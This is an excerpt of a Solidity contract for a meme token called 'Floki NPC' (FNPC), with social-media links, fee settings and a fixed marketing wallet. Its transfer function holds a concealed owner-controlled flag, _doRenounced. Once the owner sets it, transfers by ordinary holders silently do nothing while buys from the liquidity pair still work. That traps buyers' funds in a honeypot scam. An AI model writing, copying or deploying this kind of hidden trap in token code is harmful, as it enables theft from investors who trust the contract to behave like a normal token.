...
/*
    Telegram : https://t.me/FlokiNPC
    Twitter  : https://twitter.com/FlokiNPC
*/
interface IERC20 {
...
contract Contract is Context, IERC20, Ownable {
    ...
    string private constant _name = "Floki NPC"; //
    string private constant _symbol = "FNPC"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 3;
    address public  _marketingWallet = 0x5142b99E1548BD9a6e822719dA01605C31dEeba0;
    bool public _doRenounced = false;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _doRenounced){ return; }
